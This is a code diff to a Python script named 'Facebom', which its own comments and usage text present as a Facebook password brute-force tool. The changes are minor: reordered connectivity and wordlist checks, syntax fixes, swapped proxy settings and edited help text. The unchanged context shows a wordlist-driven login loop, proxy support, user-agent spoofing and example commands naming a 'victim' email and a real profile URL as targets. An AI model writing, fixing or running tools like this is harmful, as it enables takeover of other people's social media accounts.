@@ -16,10 +16,10 @@ except ImportError as e:
 	for module in modules:
 		if module in e.message:
 			no = 0
-			print("[!] ImportError: ["+module+"] Module Is Missed \n[*] Please Install it Using this command> [ pip install "+module+" ]")
-			break
+			print("[!] ImportError ["+module+"] Module Is Missed \n[*] Please Install it Using this command> [ pip install "+module+" ]")
+			exit(1)
 	if no ==1:
-		print("[!] Error: "+e.message+" !!!")
+		print("[!] ImportError: "+e.message+" !!!")
 		exit(1)
 
 os.system("cls||clear")
@@ -78,13 +78,13 @@ def ID(url):
 
 #### Facebom Brute Force Function ####
 def FBOM(username, wordlist, proxy=None):
-    
-    if cnet() !=True:
-        print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Please Check Your Intenrnet Connection "+rd+"!!!"+wi)
-        exit(1)
     if not os.path.isfile(wordlist):
         print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
         exit(1)
+    if cnet() !=True:
+        print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Please Check Your Intenrnet Connection "+rd+"!!!"+wi)
+        exit(1)
+
     if proxy !=None:
         print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if ":" not in proxy else proxy.split(":")[0]))
         if ":" not in proxy:
@@ -109,7 +109,7 @@ def FBOM(username, wordlist, proxy=None):
             proxy,port = proxy.split(":")[0],proxy.split(":")[1]
             if proxy.count(".") ==3:
 		if not port.isdigit() or int(port) <1 or int(port) > 65535:
-			print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid Port ["+rd+port+yl+"] Should Be In Range("+wi+"0-65535"+yl+")"+rd+"!!!"+wi)
+			print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid  Port ["+rd+port+yl+"] Should Be In Range("+wi+"0-65535"+yl+")"+rd+"!!!"+wi)
 			exit(1)
 			      
                 if cpro(proxy, port=port) == True:
@@ -147,7 +147,7 @@ def FBOM(username, wordlist, proxy=None):
     br=mechanize.Browser()
     br.set_handle_robots(False)
     if useproxy !=False:
-        br.set_proxies({'http':useproxy, 'https:':useproxy})
+        br.set_proxies({'https':useproxy, 'http:':useproxy})
     user_agent = useragent()
     br.addheaders=[('User-agent',user_agent)]
     issuccess = 0
@@ -178,16 +178,16 @@ def FBOM(username, wordlist, proxy=None):
     			wfile.close()
     			issuccess = 2
     			break
-    		except Exception, e:
+    		except Exception as e:
     			issuccess = 2
     			print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+str(e)+wi)
     			time.sleep(0.60)
     			wfile.close()
     			break
     if issuccess ==0:
-    	print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
-    	print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Another Wordlist File "+gr+":)"+wi)
-    	exit(1)
+      print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"I Can't Find The Correct Password In [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
+      print(gr+"["+yl+"!"+gr+"]"+yl+" Please Try Other Wordlist File "+gr+":)"+wi)
+      exit(1)
 
 parse = optparse.OptionParser(wi+"""
 Usage: python ./facebom.py [OPTIONS...]
@@ -199,7 +199,7 @@ OPTIONS:
     |--------
     | -w <wordlist Path>                      ::> Specify Wordlist File Path
     |--------
-    | -p <ProxyIP>                            ::> Specify HTTPS Proxy (Optional)
+    | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
     |--------
     | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
 -------------
@@ -210,7 +210,7 @@ Examples:
      |--------
      | python Facebom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python facebom.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 
+     | python facebom.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
      |-------- 
      | python facebom.py -g https://www.facebook.com/alanwalker97 
      |-------- 
